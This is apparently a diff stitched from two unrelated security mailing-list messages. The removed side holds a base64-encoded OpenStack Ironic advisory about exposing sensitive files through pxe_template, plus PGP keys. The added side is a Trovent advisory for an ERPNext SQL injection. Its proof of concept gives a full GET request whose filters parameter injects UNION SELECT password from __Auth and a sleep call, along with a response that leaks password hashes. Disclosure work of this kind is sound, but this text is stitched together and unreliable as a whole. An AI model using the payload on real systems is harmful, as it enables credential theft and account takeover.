-cnkgVGFudHN1ciAoUmVkIEhhdCkgYW5kIFR1b21vIFRhbnNrYW5lbiAoRXJpY3Nzb24gU29mdHdh
-cmUgDQpUZWNobm9sb2d5KSBmcm9tIHRoZSBNZXRhbDMuaW8gU2VjdXJpdHkgVGVhbSByZXBvcnRl
-ZCBhIHZ1bG5lcmFiaWxpdHkgaW4gDQpJcm9uaWMncyBib290IGludGVyZmFjZXMuIEEgcHJvamVj
-dCBvd25lciBvciBtYW5hZ2VyIHdpdGggYWNjZXNzIHRvIA0KbW9kaWZ5IGBgbm9kZS5kcml2ZXJf
-aW5mb1tweGVfdGVtcGxhdGVdYGAgY2FuIHNldCBpdCB0byANCmBgL2V0Yy9pcm9uaWMvaXJvbmlj
-LmNvbmZgYCBvciBhbnkgb3RoZXIgc2Vuc2l0aXZlIGZpbGUgcmVhZGFibGUgYnkgdGhlIA0KY29u
-ZHVjdG9yIHByb2Nlc3MuIElyb25pYyB3aWxsIHRoZW4gcGxhY2UgdGhpcyAidGVtcGxhdGUgZmls
-ZSIgaW50byBhIA0KVEZUUCBvciBIVFRQIHNlcnZlciBmb3IgbmV0Ym9vdGluZywgd2hlcmUgaXQg
-Y2FuIGJlIGZldGNoZWQgYnkgYW55dGhpbmcgDQp3aXRoIG5ldHdvcmsgYWNjZXNzIHRvIHRoZSBj
-b25kdWN0b3IuDQpJcm9uaWMgaW50ZW5kcyBvbiBjb21wbGV0ZWx5IHJlbW92aW5nIHRoaXMgZmVh
-dHVyZSBpbiBhIGZ1dHVyZSByZWxlYXNlLg0KDQoNCg0KUGF0Y2hlcw0Kfn5+fn5+fg0KLSBodHRw
-czovL3Jldmlldy5vcGVuZGV2Lm9yZy9jL29wZW5zdGFjay9pcm9uaWMvKy85OTEzODkgDQooMjAy
-My4xL2FudGVsb3BlICh1bm1haW50YWluZWQpKQ0KLSBodHRwczovL3Jldmlldy5vcGVuZGV2Lm9y
-Zy9jL29wZW5zdGFjay9pcm9uaWMvKy85OTEzODUgKDIwMjQuMS9jYXJhY2FsIA0KKHVubWFpbnRh
-aW5lZCkpDQotIGh0dHBzOi8vcmV2aWV3Lm9wZW5kZXYub3JnL2Mvb3BlbnN0YWNrL2lyb25pYy8r
-Lzk5MTM4MiAoMjAyNS4xL2Vwb3h5KQ0KLSBodHRwczovL3Jldmlldy5vcGVuZGV2Lm9yZy9jL29w
-ZW5zdGFjay9pcm9uaWMvKy85OTEzNzkgKDIwMjUuMi9mbGFtaW5nbykNCi0gaHR0cHM6Ly9yZXZp
-ZXcub3BlbmRldi5vcmcvYy9vcGVuc3RhY2svaXJvbmljLysvOTkxMzc2ICgyMDI2LjEvZ2F6cGFj
-aG8pDQotIGh0dHBzOi8vcmV2aWV3Lm9wZW5kZXYub3JnL2Mvb3BlbnN0YWNrL2lyb25pYy8rLzk5
-MTM2NyANCigyMDI2LjIvaGliaXNjdXMgKGRldmVsb3BtZW50KSkNCi0gaHR0cHM6Ly9yZXZpZXcu
-b3BlbmRldi5vcmcvYy9vcGVuc3RhY2svaXJvbmljLysvOTkxMzczIChCdWdmaXgvMzMuMCkNCi0g
-aHR0cHM6Ly9yZXZpZXcub3BlbmRldi5vcmcvYy9vcGVuc3RhY2svaXJvbmljLysvOTkxMzcwIChC
-dWdmaXgvMzQuMCkNCg0KDQpDcmVkaXRzDQp+fn5+fn5+DQotIERtaXRyeSBUYW50c3VyIGZyb20g
-UmVkIEhhdA0KLSBUdW9tbyBUYW5za2FuZW4gZnJvbSBFcmljc3NvbiBTb2Z0d2FyZSBUZWNobm9s
-b2d5DQoNCg0KUmVmZXJlbmNlcw0Kfn5+fn5+fn5+fg0KLSBodHRwczovL2J1Z3MubGF1bmNocGFk
-Lm5ldC9pcm9uaWMvK2J1Zy8yMTQ4MzE5DQotIGh0dHA6Ly9jdmUubWl0cmUub3JnL2NnaS1iaW4v
-Y3ZlbmFtZS5jZ2k/bmFtZT1DVkUtMjAyNi00NDkxNw0KDQoNCk5vdGVzDQp+fn5+fg0KLSBSZWxl
-YXNlcyAyMDI0LjEgKGNhcmFjYWwpIGFuZCAyMDIzLjEgKGFudGVsb3BlKSBhcmUgdW5tYWludGFp
-bmVkLg0KIMKgIFBhdGNoZXMgYXJlIHByb3ZpZGVkIGFzIGEgY291cnRlc3kuIFJlbGVhc2VzIDIw
-MjMuMiAoYm9iY2F0KSBhbmQNCiDCoCAyMDI0LjIgKGRhbG1hdGlvbikgYXJlIGVuZCBvZiBsaWZl
-IGFuZCBoYXZlIG5vdCBoYWQgcGF0Y2hlcyBwcm92aWRlZC4NCiDCoCBTZWUgaHR0cHM6Ly9yZWxl
-YXNlcy5vcGVuc3RhY2sub3JnIGZvciBtb3JlIGluZm9ybWF0aW9uIG9uIHN1cHBvcnRlZA0KIMKg
-IHJlbGVhc2VzLg0KLSBJcm9uaWMgYnVnZml4IGJyYW5jaCBwYXRjaGVzIHdpbGwgYmUgYXZhaWxh
-YmxlIGluIGdpdCBmb3IgaW50ZXJlc3RlZA0KIMKgIG9wZXJhdG9ycy4gV2Ugd2lsbCBub3QgcGVy
-Zm9ybSBhbiBhZGRpdGlvbmFsIHJlbGVhc2UgZnJvbSB0aGVzZQ0KIMKgIGJyYW5jaGVzLg0KDQo=
-
---------------LBCVECTf6Od08JZLbdP0gJVE
-Content-Type: application/pgp-keys; name="OpenPGP_0x6B75D939B424C6D4.asc"
-Content-Disposition: attachment; filename="OpenPGP_0x6B75D939B424C6D4.asc"
-Content-Description: OpenPGP public key
+-----------------------4f1c175b1982d7f9ca2407db5f41036b
 Content-Transfer-Encoding: quoted-printable
+Content-Type: text/plain;charset=utf-8
 
------BEGIN PGP PUBLIC KEY BLOCK-----=0A=
-=0A=
-xsFNBGFpBPQBEACaRxGb+O+Ypgxi2gg3bfkxuejyTGUYJ3dwXkoFnZvaSeq7Nx6X=0A=
-4+vEd20x/9vjuwdbXB5w3Tb4N9oIAGUpukjzVX3rBZ9TqkvOiY5KpJf8lJVCJupp=0A=
-lfUkxurWEvwdcCv9KU7HyFSKcMdmFIOGPzbg4N/d2gF52HIKTQBorI0dMAoKsBXu=0A=
-Wfb1/rK+C8wcY3gecqLgrjEdOFsQETFFSUs8Egn3Z81DMoNucBVZWnz+p7R6nhlr=0A=
-Mt9gXNBEZWPFZihteE6EovP6BXSotdyBRmmxAOBCaZZsA4CIzZoK9cb84N6y1PQH=0A=
-AAl4W7wCoakiKByF9/0gCIIbYWgauJ5oD0kQTNgwNDcygQnTdrs7UQ6GUlaT4Cgf=0A=
-eRWydLmmv8LvJyZOqFQs+3DOUTagTYZqsarfBBQO9PaeZvKbz3s5Dsr5QCeOMIVy=0A=
-4Te4tNRNExut48cp+n31ZUARCAlQHAoKiswELCkOgnKzSEVJ8PEeIYP8Up5zoWfK=0A=
-4/SaqeVrY3ziKl8RdOGW2zW7WikfgWODIp5L6erTnT2xRGGcikDbShkGzOQCIkfm=0A=
-XPzp8HmSHumIEO002KzCMsRX8jQphEPtC1QXsAwDpyYMTPjxPIvVtTQbrtoJoYCV=0A=
-uzDiETsB9VWvNRXn687uvVaFL96aui0hLO79basRPiekRp33IlXuEaxVdQARAQAB=0A=
-zR5KYXkgRmF1bGtuZXIgPGpheWZAZ2VudG9vLm9yZz7CwZcEEwEIAEECGwMFCwkI=0A=
-BwICIgIGFQoJCAsCBBYCAwECHgcCF4AWIQS8XViawYtJi5aoT61rddk5tCTG1AUC=0A=
-aMs9igUJDAS+lgAKCRBrddk5tCTG1CQdD/47lPT8z3bbBxlu9zBu4kwDBvrN1wRA=0A=
-ARwAoKE02yKiWDkYt0XqNFuAeGK5gXt+nTqHDHVmHCvDsh13CHKiZL21ZxqX8I4z=0A=
-IvuqVfHdLJ36k161qUtn/vb78kmFNqITgGmU2TfcdRCGY8lgycRbr7Z0EGOIWNlD=0A=
-u0hzE7tU0JOY2lJSeBfvq7MAAuGTy3uL1dQCZmwf8tH2u02AprfATcVz0DfwPKRl=0A=
-E/Ku4cXnLTsje2QSz3SjF0tsbUhohLipfuI5yJQaCwILHzWrMv+bX+wzO4qoUale=0A=
-ozfiCuXwHaC5XqGL4XPrTHT4IzhuURtbf6PsMvnCDTTEntajvm1veZuH+ONMkq73=0A=
-Do56v1JOXJIvpCniXlLiBu3BehCZfRolG/aeF66hkYUF9kaugsXizqbjiQ8Lljjc=0A=
-+YfGGOip6+1bhWE7qFaD+JzpVkDgJfO3gEqZlHhJsWm3GpRIpFElXAC+vits5XVJ=0A=
-ccRikHkeHLBaoUk592yRtxOQ0hIwUy6/zWhVcbv05u79ofd5WfpC0vxy1YSbYYGN=0A=
-2BZL91aZKf97GXSNVTavbXQ8mhLTQbpL2ClF6k/KQISZV9629qkhVecbbS4H9W0A=0A=
-Ce3ivVZ+FhLRCQ85huJ81YrJcecDlBNN8Ytojq5ZIEht6KCsZVngsNAOW27yxNzt=0A=
-I3Dh/PfnO+MTas0ZSmF5IEZhdWxrbmVyIDxqYXlAanZmLmNjPsLBlAQTAQgAPgIb=0A=
-AwULCQgHAgYVCgkICwIEFgIDAQIeAQIXgBYhBLxdWJrBi0mLlqhPrWt12Tm0JMbU=0A=
-BQJoyz2KBQkMBL6WAAoJEGt12Tm0JMbUXfYP+QGRxf0ICu3BR44gj24keIyqPjvC=0A=
-5TUega/ioHR2db3KJSfWqij5El6gAJBEAY5HW04KkRv2ru2BOmdz2+5vA/FimM5/=0A=
-si4LC0MvokxZ0QUqUFZI5/UmHsog9pH+lAJPs2ObzCE3mY0g0RDtziqnIyZNpw7z=0A=
-sxP6Y3A4vl+tXAeUuZ6r88vbesEHdWy6w6dgwH5LvWGsPe9vPn/Lyo/nB+ITh5HK=0A=
-6xgjuuRldNL/iYBu6Ph89wUxrEYRwkIXd63RkzYcZLu+l+G2AnopCvMUAXJQn1JM=0A=
-DJkRjLHknVAvWUslFOO3M0Hhs+Wa0V6ACWu5VDCu3gEuIaSfFmsS07WmGeqACTHk=0A=
-8/ovUoxLYz7xydReuYYoz2g0FKoAywb2HOuwXt7+dfu+Zvj50UIIltf6wVv0cj+M=0A=
-hSPI7sCN9C2kx5RzItee5VUGS2fB+46YUukxUVNgSorLfFauxtRXlbGv5ZQr3esB=0A=
-4Ll2TpP5Wd/WxdztQG5SYH5+qeUVWEb9JVVMgx3VN+bpne2axHpBp1Mj3viKXR+s=0A=
-pudGPwtFj+imrZXmA0R848a1JQn5pBuCjXDK7CljNw2LQiZUdcIVMi1kmYYNEOSj=0A=
-iB/h3cMvF07gAkhZw/K8ZefqC+z2k6ZieVrlwMC5eoRcPyfbT22F5VxGj9o+ckjH=0A=
-isvo4o0fqpuKmT8swsGUBBMBCAA+FiEEvF1YmsGLSYuWqE+ta3XZObQkxtQFAmFp=0A=
-BPQCGwMFCQeEzgAFCwkIBwIGFQoJCAsCBBYCAwECHgECF4AACgkQa3XZObQkxtSX=0A=
-QQ//VwFbzIE2x79AhX3wHReYH+6UR0qe+QuTl0zd3vp1sKukkbU+i3J4eVHmVXdT=0A=
-I2rFE1WH9TbTaEBM3qZJgXsQEQ5+im+eyZFfZbGgZLJWyig3uKOogS0OrxOjRwjl=0A=
-DLN9Orcl4de/HA1zAVrLRV3zfg8ZMj6zXrv84L54lZ5e9C7mD5oS8Ge5enFrU9kE=0A=
-dHNjqzt1PCXCeA37/HRJoR+nzHmcSzJyMMxQdo0cgiaRHYyu7LOJFL5qR0jLEmZw=0A=
-Eulmd6fMeU4Tx5eMx4o6O3diTmGyeFs/UDGWn0qcMDkh9T00Qw1bLOv/yFrpCMjE=0A=
-yryR7hJ53HYtLqEkvn/7lClrp2BUsV8XjYqexnB6unr30/RduC6koXXUHAZpk/+m=0A=
-D0WEdShFNuiFlOn8BDjBvk5k6j2VlEO3uH0BhWUBfY+bahWiLgWUhupK2Wd8qLYb=0A=
-E9VDj5jvcKVt7qonBuguDY43aXyf7gnm3u1pprGuqTcWyRijHeLXLHNZg2fCUjQ0=0A=
-tdto/YblvNexrEDxjK7nzgmHR7KDTVFcjG91yrTrO2/hmREQSN5WWk50q6n5NLBS=0A=
-MWyDuzOxG0baOuKZrSCnMamFNjMPvAnCdqe1HoNq4b7Hb9FheqJulqQFLEhGN33K=0A=
-IummGYTjJBYnz4L7c1F0iqlvEVO7MEir+a63lMWh6wIarg3OwU0EYWkE9AEQALHc=0A=
-nXwEWn5WF3y47vkl4ASUisl1QHSlYrs1qlsBmqdbQzo5TOtupuGVk9G7jqo1J1Iu=0A=
-+ejI+uYCcU1jPYH5H+PJ9AK5qcM6MGniwJNaopHmvUgERwlUcxP99IH4LGS2npnX=0A=
-SxIrSYfYBXuDUW7vbW2Ksj5XfXlBMd/6PE4b5kljOABB9SWFw3eXJunaV7h2tLne=0A=
-wqFU/sbZHLhDkAER7vwlXyTMDrkPTCyOqfweFZcn2iRD52/LsoL4hlpcGZz/mSV/=0A=
-sQJBoiM5op+3NWKKe0V4RkJ+lgACQG4jzC5jyN4XOk48tQF4ZHqyy32O+HRH4xRX=0A=
-pOAmxiZzvXLPUqSmI+uNnjyO5tzFy8K/hzL/3YtXQyxVGFYtmtILSnQORO/a37or=0A=
-eb5RQm8jvvq7R+Id2/BmdekGcxQn5l6gn4+DVyp5EW/n7wXKz5bdt74OFk6RQafb=0A=
-24RHsNbJehIHWDuK2PO5FS6T3T5S2il2khGg2wu6xh5vXyWtB3eW1skdOWwt/M/H=0A=
-FinesaCkvHTUJwTKk6BnQUzpKHyZcGRuQ+pnT/5xJumi6AztsXU29wfyaoZK1o6f=0A=
-oRRk8ojpIVZIUZyR7cV2BXzewwKyv9HihGa+P4atcjPMsGhVh6cJXxKS1xKdfn8i=0A=
-BD7ngS1LIOhDKzjQrRD7Pz/Q0SxwYgYrz51AdH7tABEBAAHCwXwEGAEIACYCGwwW=0A=
-IQS8XViawYtJi5aoT61rddk5tCTG1AUCaMs9fQUJDAS+iQAKCRBrddk5tCTG1OiG=0A=
-D/0dV4IeXX4rBG++DPiW3ZZZU5tCZjrTUIhi6KNilESLvBB5ovrdOPgrJ21CKrQX=0A=
-D9RlLTl8c5OUUaYNP0cOUx97d01ZmfquIauJbXBXWC9XiDWoUEY2eJFfMmb0EW7m=0A=
-4WU/Ot2HjOX/8U8iWW59bL8ONyAg2J/fLaFqJtLkjtqZIeoUvHO+SC5p2EYfMwms=0A=
-xIZzmtvPtLclVRvFUuJIEz9vNLCAarxas+peQ+t2FbyMvrsPISxCZ4axGZ+P+FII=0A=
-FEfckeFwYJEsVeKhj52U05wvPrsZfJIGO4KZ97PsWTNggFUCXhiYkTPoYsXnv09F=0A=
-CDeum6tFM1yGmaD5siLWI8dZdJOIhrMstYDMRlHDoQPOcugRCVv/I0rtKJ1OFG4P=0A=
-Lqbx3aR1cKYyTkpG3GtkM6rSThYFx6N4UKVE9ncCXgjyOHXglWI1BnRqzd86prEd=0A=
-evSVpaasxZjJMta6LbC6PU5Vd/ETNcnJIVsf8zLCoHx7cTmDHHoAU3rELhq5vyWm=0A=
-EpPU3zf0EnbgGXnj+C71yAdmIj04fCt6d2vnM+0nHFL7S3BB18JMpwfJbs0PPair=0A=
-KVQwhPcEWmY6u8pI1J37vTG4MrABj1qZzKJ9SnkwRU1h6uVPdsom0dOzMl+arjW1=0A=
-yZEeXN3xGPq7s2ozyhrYR475/Pvk/G+B/HiUSR3sLybbUc7ATQRnx8pTAQgAvzTh=0A=
-wcbjjoTY/Y95MBW77xGoCVrv2H1Vm36liU18LVQ15RkgsDZv/sLXN9MmUc79Dazn=0A=
-0T0I4Q3po/Micd4ka++dFUGzY0yk+VyrNJG8ibtl0/a6kNInzqUPH52yGDPWu08Y=0A=
-1Y6NAYDBmo7ePqXncZeGevKFsOGtHPV83mRIwyGPN4QOk2h3xOZ72Y3wKrGdBUIT=0A=
-+rdetAngzRaqdqyZkzvKzPB6zvEDnJOost1BDZ9FMECAJ+7MnayYE3Ytq5m/+12R=0A=
-b4IUHsVbmi914wrvO2LJCN1hS+yCEazMhgkVXJ0f4wO+ISYAoGyrBrRZE1BplEjt=0A=
-aHB69QMCNqYMih7tTQARAQABwsKyBBgBCAAmAhsCFiEEvF1YmsGLSYuWqE+ta3XZ=0A=
-ObQkxtQFAmjLPX0FCQWl+SoBQMB0IAQZAQgAHRYhBLDzBOkQOEyJiV8Bvs1FRFIp=0A=
-C0VqBQJnx8pTAAoJEM1FRFIpC0VqxMQIAInaBNwQt7qPulrEE18uHf6RyZLAI3l/=0A=
-0n3r40Cd8S9NKjAu/bnHGu0memat5YZOhot7I2tvKlNHRzPTBV+yK1rhbZH8QCwV=0A=
-s/yksTL8kJhWNm/svXRDWYv4zImTwYqB+RPSwAd2eJnknSa5xY/gOr88JKZyjlYx=0A=
-ILyC9Dp7Vo0j9GaXhr796QOKsop4BqEew4HgIkY2+79WGb0BOfAiW2pa0PNf5rn6=0A=
-vTAdmoHDgpeJytyFPTaU5N2Zdhq9c4igUW7H7t3D3M9km+1yRCoNMywVZE1mypvF=0A=
-h8ibNttffwCNw4beaGd9ePmcu0RoepG2PBCuJ5/yJOhvKCM9zmwbU3EJEGt12Tm0=0A=
-JMbULzsP/3VLk57bYrsVgLHGB+IzmvZfM6cd6K1kSa0iE3tHFd2yDGLvQ5S8PaUJ=0A=
-LZGqI9nYX0l6XkRUalU7luPB8f/wlAGnLRIoq/lCnYhmrZzAHGOq7MdKw4poK6Yk=0A=
-3vXrxMyjR1aIeARQkNDGDRmnjBM8o+ldQj9LB/ra56T21A2nk/2LGsN7CjKSlQ0p=0A=
-WIgRHEVCsSCpBDlA2vegfU1P5l5aLZuu7gZewtx7EK4hBTZiI4oTSGe4QeEkX/yA=0A=
-uXkoRHA/kdcyl0Jb9M+Xa5fZ0/m6v5lM8wJtdkByVp6wWIr9KuQQmLdedJA4dU5a=0A=
-o+7OIAJB7vVUWDu1Z3HuUSAPZe1gru2hjdD7LsU6DfjI5GMqSKKYtvTfd5hWvEEX=0A=
-mEIAkIaN9SDjH7gqcb/0WCGJIVvmx6OtcU4ndMxrNEsHljF8sI0+bu4q8serswz7=0A=
-wU0SYIqcsgLVqJaEMMKUisxhz/jycJ1yikLR+TRr3srFTEnhgS1j/cDLOLzoK6Gj=0A=
-783ny5uWumnPPgzYPtOZMz7GSflsirdYPUW4TZEwPwBKutu1p11fPWPWj0pi3bZ1=0A=
-VDf3xur65x3TpbXjyhiaKZE50HR3mPHn2Sm/8Q+9ergC7QJ18Wh13aQqHoH8n4aP=0A=
-N9B6kDLrB1xhe5UKYi1shLeKXdjDO9SPgB/FPq/hue1yvwVEuNn2=0A=
-=3DtvZI=0A=
------END PGP PUBLIC KEY BLOCK-----=0A=
+# Trovent Security Advisory 2103-01 #
+#####################################
 
---------------LBCVECTf6Od08JZLbdP0gJVE--
 
---------------85900kXHvSXpfJ4CQ2jKwslx--
+Authenticated SQL injection in ERPNext 13.0.0/12.18.0
+#####################################################
 
---------------EXc6fZAy02UVaSfnoSY8t06A
-Content-Type: application/pgp-signature; name="OpenPGP_signature.asc"
+
+Overview
+########
+
+Advisory ID: TRSA-2103-01
+Advisory version: 1.0
+Advisory status: Public
+Advisory URL: https://trovent.io/security-advisory-2103-01
+Affected product: ERPNext
+Tested versions: 12.18.0 and 13.0.0 beta
+Vendor: Frapp=C3=A9 Technologies https://frappe.io
+Credits: Trovent Security GmbH, Nick Decker, Stefan Pietsch
+
+
+Detailed description
+####################
+
+Trovent Security GmbH discovered an SQL Injection vulnerability
+in the "frappe.model.db_query.get_list" API endpoint.
+On version 13.0.0 valid credentials without any privileges are sufficient
+but on version 12.18.0 at least "system_user" privileges are required.
+The vulnerable parameter "filters" allows injection of SQL statements.
+An attacker is able to query all available database tables to retrieve
+usernames, password hashes or password reset tokens which can then be used
+to reset administrator passwords.
+
+
+Severity: High
+CVSS Score: 8.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
+CWE ID: 89
+CVE ID: TBD
+
+
+Proof of concept
+################
+
+Sample request made with a non system account to retrieve password hashes:
+
+REQUEST:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
+~~~~~
+
+
+GET /api/method/frappe.model.db_query.get_list?filters=3D%7b%22name%20UNION=
+%20SELECT%20password%20from%20%60__Auth%60%20--%20%22%3a%20%22administrator=
+%22%7d&fields=3D%5b%22name%22%5d&doctype=3DUser&limit=3D20'%3b%20do%20sleep=
+(10)&order_by=3Dname&_=3D1615372773071 HTTP/1.1
+Host: erpnext.local
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox=
+/78.0
+Accept: application/json
+Accept-Language: en-US,en;q=3D0.5
+Accept-Encoding: gzip, deflate
+X-Frappe-CSRF-Token: 0e89c5c43898da856fe12e19a57991d7bdf380477d0354f93ce6bc=
+f3
+X-Frappe-CMD:
+X-Frappe-Doctype: Dashboard%20Settings
+X-Requested-With: XMLHttpRequest
+Connection: close
+Referer: http://erpnext.local/app/website
+Cookie: io=3DNVosyhHCvV3KdkxNAAi7; sid=3D26f7ddefef642c0f88b9babfc26b751229=
+c32b565304f30815d8ec22; system_user=3Dno; full_name=3Dauth%20test%27; user_=
+id=3Dauth%40trovent.io; user_image=3D
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
+~~~~~
+
+
+
+RESPONSE:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
+~~~~~
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.7
+Date: Wed, 10 Mar 2021 16:04:40 GMT
+Content-Type: application/json
+Connection: close
+Vary: Accept-Encoding
+Set-Cookie: sid=3D26f7ddefef642c0f88b9babfc26b751229c32b565304f30815d8ec22;=
+ Expires=3DSat, 13-Mar-2021 16:04:40 GMT; HttpOnly; Path=3D/; SameSite=3DLax
+Set-Cookie: system_user=3Dno; Path=3D/; SameSite=3DLax
+Set-Cookie: full_name=3Dauth%20test%27; Path=3D/; SameSite=3DLax
+Set-Cookie: user_id=3Dauth%40trovent.io; Path=3D/; SameSite=3DLax
+Set-Cookie: user_image=3D; Path=3D/; SameSite=3DLax
+X-Frame-Options: SAMEORIGIN
+Strict-Transport-Security: max-age=3D63072000; includeSubDomains; preload
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=3Dblock
+Content-Length: 719
+
+{"message":[{"name":"$pbkdf2-sha256$29000$0fofo/SeE0IoRQgh5HyvVQ$IuyDVu5v4H=
+c4Z7Pe/3Tvpim7AdhbYrI9b9XXL39/tVU"},{"name":"$pbkdf2-sha256$29000$1vqfk3KO0=
+ZqT8n7vvff.nw$A9a6k9wbegrw5QUiJ/jj1.kXCr.lwRSJtv5S7QTCQgU"},{"name":"$pbkdf=
+2-sha256$29000$aA2B8P7/X.vd./.fM6aUkg$JluCIXXrUgKxTUwvRyveCRIDjJ0mhhoG9Cs6o=
+nAO2Do"},{"name":"$pbkdf2-sha256$29000$CSFEKCVEqPVe611rrdVayw$pFf/iBuprNIdZ=
+4DoJadro0UUNaffy.2v5EbAe4Nbxco"},{"name":"$pbkdf2-sha256$29000$L2WMkdLaG2NM=
+6V3rnXMOAQ$snURvXF1kNTGA7Zux.HLoQ5JISRajyOBiAZ1VDjEJnc"},{"name":"$pbkdf2-s=
+ha256$29000$r/UeQ.id0/rfm9M6Z4yR8g$1w/oAvTRNJ7wKuSHgZ.4jkDHQAvLLYxerzYeHpd1=
+IV8"},{"name":"gAAAAABgP1dTiYpJ67JyyUjytcay4XmKoOuyf_jAke7slDwL4gIM5lCWCbu6=
+SjYOPOX6WigAm0fZzGgTEIiXNCA_yPZI64ijmA=3D=3D"}]}
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
+~~~~~
+
+
+Solution / Workaround
+#####################
+
+To mitigate this vulnerability, we recommend to limit access to the affecte=
+d API endpoint.
+As a permanent solution it is recommended not to insert user input directly=
+ into SQL queries.
+
+
+History
+#######
+
+2021-03-10: Vulnerability found
+2021-03-11: Advisory created and vendor contacted
+2021-03-22: Vendor replied that they request CVE IDs after a fix is released
+2021-04-19: Vendor informed about planned disclosure date (2021-05-11)
+2021-05-03: Vendor contacted, asking for status
+2021-05-07: No reply from vendor, vendor contacted again
+2021-05-11: Advisory published
+
+-----------------------4f1c175b1982d7f9ca2407db5f41036b--
+
+-----------------------b87c392d4e73cb771de7a3755745f6e3
+Content-Type: application/pgp-signature; name="signature.asc"
 Content-Description: OpenPGP digital signature
-Content-Disposition: attachment; filename="OpenPGP_signature.asc"
+Content-Disposition: attachment; filename="signature.asc"
 
 -----BEGIN PGP SIGNATURE-----
+Version: ProtonMail
 
-wsB5BAABCAAjFiEEsPME6RA4TImJXwG+zUVEUikLRWoFAmogVloFAwAAAAAACgkQzUVEUikLRWqn
-lgf/fhwLrXUSA/GXDCxOOg+/NGt+zq/JNCqVCyn9u1A2FYvyhUDt2+cf6SxLc8axUpwgOJh0/v0h
-vbQUT9/61ubyOuxgVPojMdQ50rT8un3NKPqGdQjYniYLruwXcRLmPGOrMGyx+MjqvS1g4czauIT6
-CxxDcNj66Ok/4UPl8LYDOo02YpBnW4/PTRd+b4mc3f1AeQOKRfdcnMYdZu0TfBL6y1K84Y6KAqmS
-BOaB16xaSY+GttLg/Ksc4j6J5ISPXjtXmlNI/yqbTrbLprAMtbFozJLHqTRzG2GuZScVfp6YY96A
-+PTF9Olqu+GF3LAbTlGGVo53D5DxrS3KNSpYipVFKg==
-=gCQy
+wsFzBAEBCAAGBQJgmm5rACEJEM8er/4ehY63FiEE0wArIZvu5AKY9ZSXzx6v
+/h6FjrcEPQ/+MZAHdjJaC1Tut51Tltn3iSnLPB6KQGpcaYVap+9nyN5MJnHX
+tkUeQJBGzvlYG89Q6vXBCemd/cBVLFc10kp81qpAP+nDYbQmZgO70p8dUPxX
+Hfj5sS5I1MsxNsnKwz5ZJ5/3n2BfP2+jOJuzHsOdaDiQaPpxY3sDDUdjtkkg
+TbQjAeqPgU/iJQAzWzcGItgDyEs0mMi5EG1eX61gD2Q1e2mAv6Vm3JXSS1iM
+MlA4sLkEncxuKZGjpLyV3VXz/z3FMLclfYKXN1ViQtqe/NOZW5IF0GZdGXYb
+RSd46dUsVbdkcl7uJ+16PBmv7iDGpwOmbnjg91e7an9qy97mxzdfFmauqa+c
+PBPe9OTlMD7KvAeyZfd1J2sxot4JnoafofX7zlMzITGW4OnMPMOYnUXP0C/p
+FUF3BlvF+2EoECCSggzNy7uNfj/xePkf7I3fqYf3Az53SKD14lyDyfC0vWvM
+myJc6U6IaGFokLjXlM7w0bgRzZcFQpOhAzCnzqHGfv5VwJ2QvAcZo5Es3nZP
+WWQRwEEaoRUvmJeQeGfN7yD9BUtBHTKmFgbT0SdAKdpPH8BMdnitVNOHo2Vx
+y6ehdYeEyB96xRDC8GoiuoBxKDzg0X9oGUFvuVuJHzTQgm7MqG4L+TPL34Wc
+dTGnFQ9M0GQ9vLMDKy98mnrRN1iFTGpSOEE=
+=TZJp
 -----END PGP SIGNATURE-----
 
---------------EXc6fZAy02UVaSfnoSY8t06A--
+
+-----------------------b87c392d4e73cb771de7a3755745f6e3--
+
